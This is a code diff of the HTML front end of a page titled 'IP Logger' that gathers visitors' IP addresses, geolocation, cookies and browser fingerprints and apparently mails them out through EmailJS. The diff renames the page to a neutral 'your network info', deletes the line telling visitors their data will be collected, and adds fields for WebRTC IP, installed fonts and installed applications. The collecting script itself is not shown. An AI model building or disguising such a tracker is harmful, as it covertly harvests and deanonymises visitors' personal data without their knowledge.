@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
+    <title>ip info</title>
     <link rel="stylesheet" href="style.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
@@ -20,59 +19,36 @@
     <audio id="backgroundMusic" autoplay loop>
         <source src="music.mp3" type="audio/mpeg">
         <source src="music.mp4" type="audio/mp4">
-        Your browser does not support the audio tag.
+        Your browser does not support the audio element.
     </audio>
 
     <div class="container">
-        <h1>IP Logger</h1>
-        <p>Your data will be collected and analyzed.</p>
-        <div class="info-section">
-            <h2>Collected Data</h2>
-            <div class="data-item"><strong>IP Address:</strong> <span id="ip"></span></div>
-            <div class="data-item"><strong>IPv6 Address:</strong> <span id="ipv6"></span></div>
-            <div class="data-item"><strong>Location:</strong> <span id="location"></span></div>
-            <div class="data-item"><strong>ISP:</strong> <span id="isp"></span></div>
-            <div class="data-item"><strong>Country:</strong> <span id="country"></span></div>
-            <div class="data-item"><strong>Timezone:</strong> <span id="timezone"></span></div>
-            <div class="data-item"><strong>Coordinates:</strong> <span id="coords"></span></div>
-            <div class="data-item"><strong>ASN:</strong> <span id="asn"></span></div>
-            <div class="data-item"><strong>User Agent:</strong> <span id="useragent"></span></div>
-            <div class="data-item"><strong>Screen Resolution:</strong> <span id="screen"></span></div>
-            <div class="data-item"><strong>Language:</strong> <span id="lang"></span></div>
-            <div class="data-item"><strong>Connection:</strong> <span id="connection"></span></div>
-            <div class="data-item"><strong>CPU Cores:</strong> <span id="cores"></span></div>
-            <div class="data-item"><strong>Memory:</strong> <span id="memory"></span></div>
-            <div class="data-item"><strong>Touch Support:</strong> <span id="touch"></span></div>
-            <div class="data-item"><strong>Battery:</strong> <span id="battery"></span></div>
-            <div class="data-item"><strong>Device Model:</strong> <span id="deviceModel"></span></div>
-            <div class="data-item"><strong>Hardware Concurrency:</strong> <span id="hardwareConcurrency"></span></div>
-            <div class="data-item"><strong>Device Memory:</strong> <span id="deviceMemory"></span></div>
-            <div class="data-item"><strong>Plugins:</strong> <span id="plugins"></span></div>
-            <div class="data-item"><strong>MIME Types:</strong> <span id="mimeTypes"></span></div>
-            <div class="data-item"><strong>Latitude:</strong> <span id="latitude"></span></div>
-            <div class="data-item"><strong>Longitude:</strong> <span id="longitude"></span></div>
-            <div class="data-item"><strong>Accuracy:</strong> <span id="accuracy"></span></div>
-            <div class="data-item"><strong>Cookies Enabled:</strong> <span id="cookies"></span></div>
-            <div class="data-item"><strong>Local Storage:</strong> <span id="localStorageSupport"></span></div>
-            <div class="data-item"><strong>Session Storage:</strong> <span id="sessionStorageSupport"></span></div>
-            <div class="data-item"><strong>WebGL:</strong> <span id="webgl"></span></div>
-            <div class="data-item"><strong>Canvas Fingerprint:</strong> <span id="canvas"></span></div>
-            <div class="data-item"><strong>Referrer:</strong> <span id="referrer"></span></div>
-            <div class="data-item"><strong>Java Enabled:</strong> <span id="java"></span></div>
-            <div class="data-item"><strong>Flash:</strong> <span id="flash"></span></div>
-            <div class="data-item"><strong>Timezone Offset:</strong> <span id="timezoneOffset"></span></div>
-            <div class="data-item"><strong>Local Time:</strong> <span id="localTime"></span></div>
-            <div class="data-item"><strong>Platform:</strong> <span id="platform"></span></div>
-            <div class="data-item"><strong>Do Not Track:</strong> <span id="doNotTrack"></span></div>
-            <div class="data-item"><strong>Online Status:</strong> <span id="onlineStatus"></span></div>
-            <div class="data-item"><strong>Connection Type:</strong> <span id="connectionType"></span></div>
-            <div class="data-item"><strong>Downlink:</strong> <span id="downlink"></span></div>
-            <div class="data-item"><strong>Effective Type:</strong> <span id="effectiveType"></span></div>
-            <div class="data-item"><strong>Round Trip Time:</strong> <span id="rtt"></span></div>
-            <div class="data-item"><strong>Save Data:</strong> <span id="saveData"></span></div>
-            <div class="data-item"><strong>VPN/PROXY:</strong> <span id="vpn"></span></div>
-            <div class="data-item" id="savedCookiesContainer"><strong>Saved Cookies:</strong> <span id="savedCookies"></span></div>
+        <h1>your network info</h1>
+
+        <!-- Existing sections -->
+
+        <div class="section">
+            <div class="label">webrtc ip</div>
+            <div class="value" id="webrtc-ip">...</div>
         </div>
+
+        <div class="section">
+            <div class="label">installed fonts</div>
+            <div class="value" id="fonts">...</div>
+        </div>
+
+        <div class="section">
+            <div class="label">installed applications</div>
+            <div class="value" id="apps">...</div>
+        </div>
+
+        <div class="section">
+            <div class="label">system architecture</div>
+            <div class="value" id="architecture">...</div>
+        </div>
+
+        <button onclick="refresh()" id="refresh-btn">refresh data</button>
+        <a href="privacy-policy.html" target="_blank">Privacy Policy</a>
     </div>
 
     <script src="script.js"></script>
